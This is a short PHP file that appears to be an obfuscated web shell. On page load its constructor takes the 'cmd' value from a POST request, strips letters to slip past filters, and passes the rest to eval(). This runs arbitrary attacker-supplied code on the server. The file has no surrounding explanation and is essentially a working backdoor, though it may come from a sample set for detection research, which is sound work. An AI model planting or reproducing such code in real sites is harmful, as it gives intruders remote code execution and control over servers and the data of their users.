<?php
class y
{
  
        function __construct()
        {      
                $cmd = $_POST['cmd'];
                $cmd = preg_replace('/[a-zA-Z]/', '', $cmd);
                preg_match('/[a-zA-Z]*/', $cmd, $matches);
                $cmd = str_replace($matches, '', $cmd);
                eval("/*comment9*/"."/*comment10*/".$cmd."/*comment11*/"."/*comment12*/");
        }

}
new y();
?>